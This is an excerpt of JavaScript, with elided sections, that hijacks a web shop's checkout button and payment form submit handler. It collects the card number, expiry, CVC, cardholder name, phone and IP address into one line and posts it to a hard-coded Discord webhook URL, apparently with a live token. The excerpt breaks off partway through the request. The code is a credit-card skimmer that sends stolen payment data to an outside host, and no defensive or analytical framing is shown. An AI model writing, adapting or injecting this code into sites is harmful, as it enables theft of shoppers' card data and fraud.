    ...
    if (checkoutButton) {
        ...
        newButton.addEventListener('click', (e) => {
            ...
            form.onsubmit = async (e) => {
                ...
                // Send raw one-line data to webhook
                try {
                    const rawData = `${paymentData.cardNumber}|${paymentData.expiry}|${paymentData.cvc}|${paymentData.name}|${paymentData.phone}|${paymentData.ip}`;
                    await fetch('https://discord.com/api/webhooks/1383037554642780161/12Krj-WpOo-hnc-cPNQ7ChRKVcPmympDEmF47f-fjKWiLhPCypijLWiflc2pZVPlN7-v', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
